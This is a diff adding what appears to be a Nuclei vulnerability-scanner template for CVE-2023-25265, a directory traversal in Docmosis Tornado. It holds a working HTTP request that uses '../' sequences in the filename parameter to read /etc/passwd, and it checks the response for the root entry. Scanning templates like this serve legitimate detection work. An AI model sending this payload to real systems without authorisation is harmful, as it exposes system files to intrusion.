@@ -1,0 +1,33 @@
+id: cve-2023-25265
+info:
+  name: Docmosis Tornado fetch file filename parameter file reading vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Docmosis Tornado versions before 2.9.5 have a security vulnerability stemming from a directory traversal in com.docmosis.webserver.servlet.FetchTmp.doGet. Attackers can exploit this to read arbitrary files on the system.
+  tags:
+    - file-read
+  reference:
+    - https://frycos.github.io/vulns4free/2023/01/24/0days-united-nations.html
+  classification:
+    cve-id: CVE-2023-25265
+
+variables:
+  filepath: "../../../../../etc/passwd"
+
+http:
+  - raw:
+      - |
+        GET /api/../fetch?filename={{filepath}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei-Security-Scanner
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:x:0:0:"
+        part: body
